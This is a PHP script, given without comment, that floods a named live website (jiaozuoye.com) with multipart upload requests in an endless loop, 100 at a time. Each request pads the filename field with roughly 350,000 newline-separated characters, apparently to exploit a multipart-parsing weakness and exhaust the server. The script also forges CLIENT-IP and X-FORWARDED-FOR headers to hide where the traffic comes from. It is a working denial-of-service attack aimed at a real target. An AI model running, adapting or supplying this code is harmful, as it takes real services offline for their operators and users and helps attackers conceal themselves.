<?php
    set_time_limit(0);
    $urls = array();

    for ($i=0; $i < 100; $i++)
        array_push($urls, 'http://jiaozuoye.com/joj/');

    $mp = new MultiHttpRequest($urls);
    do
    {
        $mp->start();
    }while (1);

    class MultiHttpRequest
    {
        public $urls = array();
        public $curlopt_header = 1;
        public $method = "GET";

        function __construct($urls=false)
        {
            $this->urls = $urls;
        }

        function start()
        {
            if(!is_array($this->urls) || count($this->urls) == 0)
               return false;

            $curl = $text = array();
            $handle = curl_multi_init();

            foreach($this->urls as $k => $url)
               $curl[$k] = $this->add_handle($handle, $url);

            $this->exec_handle($handle);

            foreach($this->urls as $k => $v)
            {
                //$c = curl_multi_getcontent($curl[$k]);
                curl_multi_remove_handle($handle, $curl[$k]);
            }

            curl_multi_close($handle);
        }

        private function add_handle($handle, $url)
        {
            $con = "a\na";
            for ($i=0; $i<350000 ; $i++)
                 $con .="a\n";

            $header = array(
                'CLIENT-IP:58.68.44.61',
                'X-FORWARDED-FOR:58.68.44.61',
                'Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryX3B7rDMPcQlzmJE1',
            );

            $post = "------WebKitFormBoundaryX3B7rDMPcQlzmJE1\nContent-Disposition: form-data; name=\"file\"; filename=\"sp.jpg";
            $post .= $con;
            $post .= '"';
            $post .= "\nContent-Type: application/octet-stream\r\n\r\ndatadata\r\n------WebKitFormBoundaryX3B7rDMPcQlzmJE1--";

            $curl=curl_init();
            curl_setopt($curl,CURLOPT_URL,$url);
            curl_setopt($curl,CURLOPT_HEADER,$this->curlopt_header);
            curl_setopt($curl,CURLOPT_HTTPHEADER, $header);
            curl_setopt($curl,CURLOPT_POSTFIELDS, $post);
            curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
            curl_multi_add_handle($handle,$curl);

            return $curl;
        }

        private function exec_handle($handle)
        {
            $flag = 0;
            do
            {
            	curl_multi_exec($handle, $flag);
            } while ($flag > 0);
        }
    }
?>